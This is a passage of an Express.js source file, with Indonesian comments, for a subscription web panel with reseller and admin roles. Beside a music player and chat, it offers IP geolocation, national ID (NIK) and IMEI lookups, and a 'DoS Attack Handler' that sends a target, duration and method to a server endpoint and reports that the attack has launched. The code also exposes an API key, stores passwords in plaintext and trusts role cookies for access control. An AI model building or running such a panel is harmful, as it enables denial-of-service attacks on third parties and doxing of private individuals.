const playlistContainer = document.getElementById("playlist");

// Generate playlist
playlist.forEach((song, index) => {
  const li = document.createElement("li");
  li.textContent = song.title;
  li.classList.add("playlist-item");
  li.onclick = () => { 
    currentSongIndex = index; 
    loadSong(currentSongIndex, true); // true = langsung play
  };
  playlistContainer.appendChild(li);
});

// Load song
function loadSong(index, autoplay = false) {
  musicPlayer.src = playlist[index].url;
  currentTitle.textContent = playlist[index].title;
  highlightActiveSong();
  if (autoplay) {
    musicPlayer.play();
    playBtn.textContent = "❚❚";
  } else {
    playBtn.textContent = "▶";
  }
}

// Highlight active song
function highlightActiveSong() {
  [...playlistContainer.children].forEach((li, idx) => {
    li.classList.toggle("active", idx === currentSongIndex);
  });
}

// Play / Pause
function togglePlay() {
  if (musicPlayer.paused) {
    musicPlayer.play();
    playBtn.textContent = "❚❚";
  } else {
    musicPlayer.pause();
    playBtn.textContent = "▶";
  }
}

// Next / Prev
function nextSong() {
  currentSongIndex = (currentSongIndex + 1) % playlist.length;
  loadSong(currentSongIndex, true);
}

function prevSong() {
  currentSongIndex = (currentSongIndex - 1 + playlist.length) % playlist.length;
  loadSong(currentSongIndex, true);
}

// Auto next
musicPlayer.addEventListener("ended", nextSong);

// Update progress bar safely
musicPlayer.addEventListener("timeupdate", () => {
  if (!isNaN(musicPlayer.duration)) {
    const progress = (musicPlayer.currentTime / musicPlayer.duration) * 100;
    progressBar.value = progress;
  }
});

// Seek music
progressBar.addEventListener("input", () => {
  if (!isNaN(musicPlayer.duration)) {
    musicPlayer.currentTime = (progressBar.value / 100) * musicPlayer.duration;
  }
});

// Load pertama kali tanpa autoplay
loadSong(currentSongIndex, false);

// === TRACK IP ===
document.getElementById("trackBtn").addEventListener("click", async () => {
  const ip = document.getElementById("ipInput").value.trim();
  const resultDiv = document.getElementById("trackingResult");
  if (!ip) return alert("Masukkan IP dulu!");

  resultDiv.innerHTML = "🔎 Mencari data IP...";
  try {
    const resp = await fetch(\`https://ip-geo-location10.p.rapidapi.com/ip?ip=\${encodeURIComponent(ip)}\`, {
      method: "GET",
      headers: {
        "x-rapidapi-host": "ip-geo-location10.p.rapidapi.com",
        "x-rapidapi-key": "7e2fcbdf66mshf1a86c06dd570d0p1409e8jsn9b22e627c852"
      }
    });
    const data = await resp.json();

    if (!data || data.code !== 200) {
      resultDiv.innerHTML = "❌ IP tidak ditemukan.";
      return;
    }

    const r = data.result || {};
    resultDiv.innerHTML = \`
      <b>IP:</b> \${r.ip || '-'}<br>
        <b>Versi IP:</b> \${r.ip_version || '-'}<br>
        <b>Negara:</b> \${r.country || '-'} (\${r.country_code || '-'})<br>
        <b>Region:</b> \${r.region || '-'}<br>
        <b>Kota:</b> \${r.city || '-'}<br>
        <b>Kode Pos:</b> \${r.zip_code || '-'}<br>
        <b>Zona Waktu:</b> \${r.time_zone || '-'}<br>
        <b>Koordinat:</b> \${r.latitude || '-'}, \${r.longitude || '-'}<br>
        <a href="https://www.google.com/maps?q=\${r.latitude},\${r.longitude}" target="_blank">📍 Lihat di Google Maps</a>
      \`;
  } catch (err) {
    console.error(err);
    resultDiv.innerHTML = "❌ Error mengambil data IP.";
  }
  });

// === CEK NIK ===
document.getElementById("nikBtn").addEventListener("click", async () => {
  const nik = document.getElementById("nikInput").value.trim();
  const resultDiv = document.getElementById("nikResult");
  if (!nik) return alert("Masukkan NIK dulu!");

  resultDiv.innerHTML = "🔎 Mengecek NIK...";
  try {
    const resp = await fetch(\`https://nik-parser.p.rapidapi.com/ektp?nik=\${encodeURIComponent(nik)}\`, {
      method: "GET",
      headers: {
        "x-rapidapi-host": "nik-parser.p.rapidapi.com",
        "x-rapidapi-key": "7e2fcbdf66mshf1a86c06dd570d0p1409e8jsn9b22e627c852"
      }
    });
    const data = await resp.json();

    if (!data || data.errCode !== 0) {
      resultDiv.innerHTML = "❌ NIK tidak valid.";
      return;
    }

    const r = data.data || {};
    resultDiv.innerHTML = \`
      <b>NIK:</b> \${nik}<br>
      <b>Provinsi:</b> \${r.province || '-'}<br>
      <b>Kota/Kabupaten:</b> \${r.city || '-'}<br>
      <b>Kecamatan:</b> \${r.district || '-'}<br>
      <b>Kode Pos:</b> \${r.zipcode || '-'}<br>
      <b>Jenis Kelamin:</b> \${r.gender || '-'}<br>
      <b>Tanggal Lahir:</b> \${r.birthdate || '-'}<br>
      <b>Status Pernikahan:</b> \${r.marital_status || '-'}
    \`;
  } catch (err) {
    console.error(err);
    resultDiv.innerHTML = "❌ Error mengambil data NIK.";
  }
  });

// === CEK IMEI ===
document.getElementById("imeiBtn").addEventListener("click", async () => {
  const imei = document.getElementById("imeiInput").value.trim();
  const resultDiv = document.getElementById("imeiResult");
  if (!imei) return alert("Masukkan IMEI dulu!");

  resultDiv.innerHTML = "🔎 Mengecek IMEI...";
  try {
    const resp = await fetch("https://imei-checker4.p.rapidapi.com/imei", {
      method: "POST",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "x-rapidapi-key": "7e2fcbdf66mshf1a86c06dd570d0p1409e8jsn9b22e627c852",
        "x-rapidapi-host": "imei-checker4.p.rapidapi.com"
      },
      body: new URLSearchParams({ imei })
    });
    const data = await resp.json();
    const r = data.data || {};

    if (!r || !r.valid) {
      resultDiv.innerHTML = "❌ IMEI tidak valid.";
      return;
    }

    resultDiv.innerHTML = \`
        <b>Perangkat:</b> \${r.name || '-'}<br>
        <b>Brand:</b> \${r.brand || '-'}<br>
        <b>Model:</b> \${r.model || '-'}<br>
        <b>Pabrikan:</b> \${r.manufacturer || '-'}<br>
        <b>Jenis:</b> \${r.type || '-'}<br>
        <b>Blacklist:</b> \${r.blacklist?.status ? 'Terdaftar' : 'Tidak'}
      \`;
  } catch (err) {
    console.error(err);
    resultDiv.innerHTML = "❌ Error mengambil data IMEI.";
  }
  });

  // DoS Attack Handler (FIXED & IMPROVED)
  document.getElementById('dosBtn').addEventListener('click', async () => {
    const dosBtn = document.getElementById('dosBtn');
    const target = document.getElementById('dosTarget').value.trim();
    const time = document.getElementById('dosTime').value.trim();
    const method = document.getElementById('dosMethod').value;
    const resultDiv = document.getElementById('dosResult');

    if (!target || !time) {
        showToast("❌ Target dan durasi wajib diisi.");
        return;
    }

    // Memberikan feedback visual saat proses berjalan
    dosBtn.disabled = true;
    dosBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Launching...';
    resultDiv.innerHTML = "🚀 Menginisialisasi serangan...";

    try {
        // PERINGATAN: endpoint /exc adalah placeholder. Ganti dengan endpoint API server Anda.
        const res = await fetch(\`/exc?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
        const data = await res.json();

        if (res.ok) {
            resultDiv.innerHTML = \`✅ <strong style="color: #00ff7f;">Serangan Berhasil Diluncurkan!</strong><br><br>
                                   <span style="color: #ccc;">Pesan Server:</span> \${data.message}\`;
        } else {
            resultDiv.innerHTML = \`❌ <strong style="color: #ff4d4d;">Gagal:</strong> \${data.message || 'Server merespon dengan error.'}\`;
        }
    } catch (err) {
        console.error("DoS Fetch Error:", err);
        resultDiv.innerHTML = "❌ Error: Tidak dapat terhubung ke server. Cek koneksi Anda.";
    } finally {
        // Mengembalikan tombol ke keadaan semula setelah selesai
        dosBtn.disabled = false;
        dosBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
    }
    });
    
// =======================
// GROUP CHAT pakai socket.io
// =======================
const chatWindow = document.getElementById("chatWindow");
const socket = io("${VPS}:${PORT}");

    socket.on("statusUpdate", (data) => {
      document.getElementById("onlineUsers").textContent = data.onlineUsers;
      document.getElementById("activeSender").textContent = data.activeSender;
    });

// Gunakan username dari login (fallback Guest)
const chatUsername = "${username}" || "Guest";

// Kirim teks
document.getElementById("sendChatBtn").addEventListener("click", () => {
const input = document.getElementById("chatInput");
const msg = input.value.trim();
if (!msg) return;

socket.emit("chatMessage", {  
  user: chatUsername,  
  type: "text",  
  content: msg,  
  time: new Date().toLocaleTimeString()  
});  

input.value = "";

});

// Kirim file
document.getElementById("fileBtn").addEventListener("click", () => {
document.getElementById("fileInput").click();
});
document.getElementById("fileInput").addEventListener("change", (e) => {
const file = e.target.files[0];
if (file) {
const reader = new FileReader();
reader.onload = () => {
socket.emit("chatMessage", {
user: chatUsername,
type: "file",
content: { name: file.name, url: reader.result },
time: new Date().toLocaleTimeString()
});
};
reader.readAsDataURL(file);
}
});

// Kirim gambar
document.getElementById("imageBtn").addEventListener("click", () => {
document.getElementById("imageInput").click();
});
document.getElementById("imageInput").addEventListener("change", (e) => {
const file = e.target.files[0];
if (file) {
const reader = new FileReader();
reader.onload = () => {
socket.emit("chatMessage", {
user: chatUsername,
type: "image",
content: reader.result,
time: new Date().toLocaleTimeString()
});
};
reader.readAsDataURL(file);
}
});

// Kirim voice note
let mediaRecorder;
let audioChunks = [];
document.getElementById("recordBtn").addEventListener("click", async () => {
if (!mediaRecorder || mediaRecorder.state === "inactive") {
const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
mediaRecorder = new MediaRecorder(stream);
audioChunks = [];
mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
mediaRecorder.onstop = () => {
const blob = new Blob(audioChunks, { type: "audio/webm" });
const reader = new FileReader();
reader.onload = () => {
socket.emit("chatMessage", {
user: chatUsername,
type: "audio",
content: reader.result,
time: new Date().toLocaleTimeString()
});
};
reader.readAsDataURL(blob);
};
mediaRecorder.start();
document.getElementById("recordBtn").style.color = "red";
} else {
mediaRecorder.stop();
document.getElementById("recordBtn").style.color = "";
}
});

// Terima pesan dari server
socket.on("chatMessage", (data) => {
addMessage(data);
});

// Helper
function addMessage(data) {
  const div = document.createElement("div");
  div.classList.add("message");

  // kasih class berdasarkan user
  if (data.user === chatUsername) {
    div.classList.add("user");  // pesan sendiri
  } else if (data.user === "SYSTEM") {
    div.classList.add("system"); // pesan sistem (welcome, dll)
  } else {
    div.classList.add("other"); // pesan orang lain
  }

  // username + waktu
  const info = document.createElement("div");
  info.classList.add("info");
  info.textContent = \`\${data.user} • \${data.time}\`;
  div.appendChild(info);

  // isi konten sesuai tipe
  if (data.type === "text") {
    const span = document.createElement("span");
    span.textContent = data.content;
    div.appendChild(span);
  }
  if (data.type === "file") {
    const link = document.createElement("a");
    link.href = data.content.url;
    link.download = data.content.name;
    link.textContent = "📎 " + data.content.name;
    div.appendChild(link);
  }
  if (data.type === "image") {
    const img = document.createElement("img");
    img.src = data.content;
    img.style.maxWidth = "120px";
    img.style.borderRadius = "6px";
    div.appendChild(img);
  }
  if (data.type === "audio") {
    const audio = document.createElement("audio");
    audio.src = data.content;
    audio.controls = true;
    div.appendChild(audio);
  }

  // Tambahkan ke window chat
  chatWindow.appendChild(div);
  chatWindow.scrollTop = chatWindow.scrollHeight; // auto-scroll ke bawah
}



  const togglePasswordBtn = document.getElementById('togglePasswordBtn');
  const bannerPassword = document.getElementById('bannerPassword');
  const toggleIcon = document.getElementById('toggleIcon');

  if (togglePasswordBtn && bannerPassword) {
    let autoHideTimer = null;

    togglePasswordBtn.addEventListener('click', () => {
      const isHidden = bannerPassword.type === 'password';

      // toggle type
      bannerPassword.type = isHidden ? 'text' : 'password';

      // ganti icon
      toggleIcon.classList.toggle('fa-eye', !isHidden);
      toggleIcon.classList.toggle('fa-eye-slash', isHidden);

      // accessibility label
      togglePasswordBtn.setAttribute('aria-label', isHidden ? 'Hide password' : 'Show password');

      // optional: auto-hide setelah 8 detik (reset timer tiap klik)
      if (autoHideTimer) clearTimeout(autoHideTimer);
      if (isHidden) {
        autoHideTimer = setTimeout(() => {
          bannerPassword.type = 'password';
          toggleIcon.classList.remove('fa-eye-slash');
          toggleIcon.classList.add('fa-eye');
          togglePasswordBtn.setAttribute('aria-label', 'Show password');
        }, 8000); // 8000ms = 8s
      }
    });
  }
  
    const messagesDiv = document.getElementById("messages");
    const input = document.getElementById("userInput");
    const sendBtn = document.getElementById("sendBtn");

    // Tambah pesan ke layar
    function appendMessage(text, sender) {
      const div = document.createElement("div");
      div.classList.add("message", sender);
      div.textContent = text;
      messagesDiv.appendChild(div);
      messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }

    // Kirim pesan ke server
    async function sendMessage() {
      const text = input.value.trim();
      if (!text) return;

      appendMessage(text, "user");
      input.value = "";

      appendMessage("⚙️ OrchidX lagi mikir...", "ai");

      try {
        const res = await fetch(\`/ai?text=\${encodeURIComponent(text)}\`);
        const data = await res.json();

        messagesDiv.lastChild.remove(); // hapus teks "lagi mikir"

        if (data.status) {
          appendMessage(data.response, "ai");
        } else {
          appendMessage("⚠️ " + data.message, "ai");
        }
      } catch (err) {
        messagesDiv.lastChild.remove();
        appendMessage("❌ Gagal konek ke server, bro.", "ai");
      }
    }

    // Tekan tombol Enter atau klik Kirim
    sendBtn.addEventListener("click", sendMessage);
    input.addEventListener("keypress", (e) => {
      if (e.key === "Enter") sendMessage();
    });
  
  
  // ==========================
  // 🔹 Initial check (yang lo minta)
  // ==========================
  checkEnable();
});
</script>

</body>
</html>
`;
};

// Appp Get root Server \\
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  const username = req.cookies.sessionUser;
  const role = req.cookies.sessionRole;
  const isLoggedIn = req.cookies.isLoggedIn;

  if (username && role && isLoggedIn === "true") {
    const users = getUsers();
    const user = users.find(u => u.username === username && u.role === role);

    // Pastikan user ditemukan & belum expired
    if (user && (!user.expired || Date.now() < user.expired)) {
      return res.redirect("/execution");
    }
  }

  // Jika belum login / expired, arahkan ke halaman login awal
  const filePath = path.join(__dirname, "X7-System", "index.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  // Jika masih login dan belum expired, langsung lempar ke /execution
  if (username && currentUser && currentUser.expired && Date.now() < currentUser.expired) {
    return res.redirect("/execution");
  }

  const filePath = path.join(__dirname, "X7-System", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, password } = req.body;
  const users = getUsers();
  const user = users.find(u => u.username === username && u.password === password);

  if (!user || (user.expired && Date.now() > user.expired)) {
    return res.redirect("/login?msg=Login%20gagal%20atau%20expired");
  }

  // Cek apakah sedang login di device lain
  if (user.isLoggedIn && user.role !== "owner") {
  return res.redirect("/login?msg=User%20sudah%20login%20di%20device%20lain");
}

  // Set user sebagai login
  user.isLoggedIn = true;
    console.log(`[ ${chalk.green('LogIn')} ] -> ${user.username}`);
  saveUsers(users);

  const oneDay = 24 * 60 * 60 * 1000;

  res.cookie("sessionUser", username, {
  maxAge: 24 * 60 * 60 * 1000, // 1 hari
  httpOnly: true,
  sameSite: "lax"
});
res.cookie("sessionRole", user.role, {
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  sameSite: "lax"
});
  return res.redirect("/execution");
});


app.get("/userlist", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUsername = req.cookies.sessionUser;

  if (!["reseller", "admin" , "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }
  
  app.get("/chat", (req, res) => {
  res.json(getChat());
});

app.post("/chat", express.json(), (req, res) => {
  const username = req.cookies.sessionUser || "Guest";
  const role = req.cookies.sessionRole || "user";
  const message = (req.body.message || "").trim();

  if (!message) return res.status(400).json({ error: "Pesan kosong" });

  const chats = getChat();
  const newMessage = {
    user: username,
    role: role,
    message: message,
    time: Date.now()
  };
  chats.push(newMessage);
  saveChat(chats);

  res.json({ success: true });
});

  const users = getUsers();

  const tableRows = users.map(user => {
    const isProtected =
  user.username === currentUsername || // tidak bisa hapus diri sendiri
  (role === "reseller" && user.role !== "user") || // reseller hanya hapus user
  (role === "admin" && (user.role === "admin" || user.role === "owner")) || // admin gak bisa hapus admin/owner
  (role !== "owner" && user.role === "owner"); // selain owner gak bisa hapus owner

    return `
      <tr>
        <td>${user.username}</td>
        <td>${user.role.charAt(0).toUpperCase() + user.role.slice(1)}</td>
        <td>${new Date(user.expired).toLocaleString("id-ID")}</td>
        <td>
            ${isProtected ? `<span class="icon-disabled">
  <i class="fas fa-times"></i>
</span>` : `  
                <form method="POST" action="/hapususer" style="display:inline">
                <input type="hidden" name="username" value="${user.username}" />
                <button type="submit" style="margin-right:10px;">Delete</button>
        </form>
  `}
  ${(
  role === "owner" ||
  (role === "admin" && (user.role === "user" || user.role === "reseller")) ||
  (role === "reseller" && user.role === "user")
)
      ? `
      <a href="/edituser?username=${user.username}"><button>Edit</button></a>
      `: ""}
    </td>
      </tr>
    `;
  }).join("");

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Daftar User</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000;
  color: #3C44D5;
  min-height: 100vh;
  padding: 16px;
  position: relative;
  overflow-y: auto;
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
    }

    h2 {
      text-align: center;
      margin-bottom: 16px;
      color: #2B33DD;
      font-size: 22px;
      font-family: 'Poppins', sans-serif;
    }

    .table-container {
      overflow-x: auto;
      border-radius: 10px;
      border: 1px solid #2C2BE2;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      font-size: 14px;
      margin-bottom: 20px;
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 360px;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #263BEE;
      font-family: 'Poppins', sans-serif;
    }

    th, td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #2B2CE2;
      white-space: nowrap;
    }

    th {
      background: rgba(26, 0, 26, 0.8);
      color: #2B2EFF;
    }

    td {
      background: rgba(13, 0, 13, 0.7);
    }

    button {
      background: #2B4DE2;
      color: white;
      padding: 6px 10px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 13px;
    }

    .icon-disabled {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 64px;
  height: 32px;  
  color: #ff5555;
  font-size: 18px;
  border-radius: 6px;
}

   .icon-disabled i {
  pointer-events: none;
}

    .back-btn, #toggleFormBtn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #000B82;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    #userFormContainer {
      display: none;
      margin-top: 20px;
      background: rgba(0, 2, 26, 0.8);
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #2B3BE2;
      backdrop-filter: blur(5px);
    }

    #userFormContainer input,
    #userFormContainer select {
      padding: 10px;
      width: 100%;
      border-radius: 8px;
      border: none;
      background: #01001A;
      color: #2748EC;
      margin-bottom: 12px;
    }

    #userFormContainer button[type="submit"] {
      width: 100%;
      padding: 14px;
      background: #2B61E2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    @media (max-width: 600px) {
      h2 { font-size: 18px; }
      table { font-size: 13px; }
      th, td { padding: 8px; }
      button, .back-btn, #toggleFormBtn { font-size: 13px; }
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <h2>List User</h2>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Username</th>
            <th>Role</th>
            <th>Expired</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <button id="toggleFormBtn"><i class="fas fa-user-plus"></i> Add User</button>

<div id="userFormContainer">
  <form action="/adduser" method="POST">
    <label>Username</label>
    <input type="text" name="username" placeholder="Username" required>
    <label>Password</label>
    <input type="text" name="password" placeholder="Password" required>
    <label>Durasi</label>
    <input type="number" name="durasi" placeholder="Duration (days)" required min="1">
    
    <label>Role</label>
    <select id="roleSelect" name="role" required></select>

    <button type="submit">Add User</button>
  </form>
</div>

    <a href="/execution" class="back-btn"><i class="fas fa-arrow-left"></i> Dashboard</a>
    
<script>
  const currentRole = "${role}";
  const roleOptions = {
    owner: ["user", "reseller", "admin"],
    admin: ["user", "reseller"],
    reseller: ["user"]
  };
  const labels = {
    user: "User",
    reseller: "Reseller",
    admin: "Admin"
  };

  const allowedRoles = roleOptions[currentRole] || [];
  const roleSelect = document.getElementById("roleSelect");

  allowedRoles.forEach(role => {
    const opt = document.createElement("option");
    opt.value = role;
    opt.textContent = labels[role];
    roleSelect.appendChild(opt);
  });
</script>

  <script>
    $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3
    });

    const toggleBtn = document.getElementById("toggleFormBtn");
    const form = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = form.style.display === "none" || form.style.display === "";
      form.style.display = isHidden ? "block" : "none";
      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-times"></i> Cancell'
        : '<i class="fas fa-user-plus"></i> Add User';
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUser = req.cookies.sessionUser;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses berdasarkan role pembuat
  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  if (sessionRole === "reseller" && role !== "user") {
    return res.send("🚫 Reseller hanya boleh membuat user biasa.");
  }

  if (sessionRole === "admin" && role === "admin") {
    return res.send("🚫 Admin tidak boleh membuat admin lain.");
  }

  const users = getUsers();

  // Cek username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;

  users.push({
    username,
    password,
    expired,
    role,
    telegram_id: req.cookies.sessionID,
    isLoggedIn: false
  });

  saveUsers(users);
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // Tidak bisa hapus diri sendiri
  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya bisa hapus user biasa.");
  }

  // Admin tidak boleh hapus admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa hapus admin lain.");
  }

  // Admin/reseller tidak boleh hapus owner
  if (targetUser.role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa menghapus owner.");
  }

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});


app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUser = req.cookies.sessionUser;
  const username = req.query.username;

  if (!["reseller", "admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  if (!username) {
    return res.send("❗ Username tidak valid.");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒 Proteksi akses edit
  if (username === currentUser) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (role === "reseller" && user.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (role === "admin" && user.role === "admin") {
    return res.send("❌ Admin tidak bisa edit admin lain.");
  }

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${user.role}" selected hidden>${user.role}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Edit User</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000000;
  color: #423EC8;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-y: auto; 
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #402BE2;
      font-family: 'Poppins', sans-serif;
      text-shadow: 0 0 8px rgba(43, 81, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #522BE2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(46, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #26359B;
      font-family: 'Poppins', sans-serif;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color:#4533D0 #4F2DCA;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #472BE2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    button:hover {
      background: #4032CC;
      transform: scale(1.02);
    }

    .back-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #040082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    .back-btn:hover {
  background: #2a004a;
  transform: scale(1.02);
}

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Efek Partikel -->
  <div id="particles"></div>

  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired</label>
        <input type="text" value="${expiredText} - Remaining time: ${sisaHari} more days" disabled class="expired-info">

        <label>Extend</label>
        <input type="number" name="extend" min="0" placeholder="Duration (days)">

        <label>Role</label>
        <select name="role">
          ${roleOptions}
        </select>

        <button type="submit"><i class="fas fa-save"></i> Save Changes</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn" style="display:block; max-width:480px; margin:20px auto;"><i class="fas fa-arrow-left"></i> Back to User List</a>
  </div>

  <!-- JS Partikel -->
  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
